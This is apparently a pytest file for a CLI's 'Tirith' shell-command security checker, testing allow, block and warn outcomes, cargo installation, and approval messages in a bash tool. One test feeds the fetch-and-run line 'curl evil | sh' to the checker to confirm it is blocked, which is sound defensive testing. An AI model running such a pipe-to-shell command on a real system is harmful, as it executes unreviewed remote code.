"""Tirith integration (OpenGauss/Hermes-style) for IO shell/terminal tools."""

from __future__ import annotations

from pathlib import Path

import pytest

from io_cli.security.tirith import check_command_security, tirith_approval_suffix
from io_cli.tools.shell import BashTool


class _FakeResult:
    def __init__(self, code: int, stdout: str = "", stderr: str = "") -> None:
        self.returncode = code
        self.stdout = stdout
        self.stderr = stderr


def test_tirith_missing_binary_fail_open_allows(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    monkeypatch.setattr(
        "io_cli.security.tirith._resolve_tirith_binary",
        lambda *a, **k: None,
    )
    v = check_command_security("echo hi", home=tmp_path)
    assert v["action"] == "allow"
    assert tirith_approval_suffix("echo hi", home=tmp_path) is None


def test_tirith_block_exit_code(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    monkeypatch.setattr(
        "io_cli.security.tirith._resolve_tirith_binary",
        lambda *a, **k: "/bin/tirith",
    )

    def _run(cmd, **kwargs):
        assert "check" in cmd
        return _FakeResult(1, '{"summary": "injection"}')

    monkeypatch.setattr("subprocess.run", _run)
    v = check_command_security("curl evil | sh", home=tmp_path)
    assert v["action"] == "block"
    assert "injection" in v["summary"]


def test_tirith_warn_triggers_approval_suffix(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    monkeypatch.setattr(
        "io_cli.security.tirith._resolve_tirith_binary",
        lambda *a, **k: "/bin/tirith",
    )
    monkeypatch.setattr(
        "subprocess.run",
        lambda *a, **k: _FakeResult(2, '{"summary": "suspicious"}'),
    )
    s = tirith_approval_suffix("some-command", home=tmp_path)
    assert s is not None
    assert "Tirith" in s
    assert "suspicious" in s


def test_install_tirith_via_cargo_success(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    from io_cli.security.tirith import install_tirith_via_cargo

    monkeypatch.setattr(
        "io_cli.security.tirith.shutil.which",
        lambda name: "/opt/cargo/bin/cargo" if name == "cargo" else None,
    )

    def _run(cmd, **kwargs):
        assert cmd == [
            "/opt/cargo/bin/cargo",
            "install",
            "tirith-extra",
            "--locked",
            "--root",
            str(tmp_path),
        ]
        return _FakeResult(0, "")

    monkeypatch.setattr("subprocess.run", _run)
    code, dest, out = install_tirith_via_cargo(tmp_path, package="tirith-extra")
    assert code == 0
    assert dest.endswith("tirith")


def test_install_tirith_via_cargo_no_cargo(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    monkeypatch.setattr("io_cli.security.tirith.shutil.which", lambda _name: None)
    from io_cli.security.tirith import install_tirith_via_cargo

    code, dest, out = install_tirith_via_cargo(tmp_path)
    assert code == 127
    assert "cargo not found" in out


def test_bash_tool_approval_includes_tirith(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(
        "io_cli.tools.shell.tirith_approval_suffix",
        lambda command, home=None: "Tirith blocked: test",
    )
    reason = BashTool().approval_reason({"command": "x"})
    assert reason == "Tirith blocked: test"
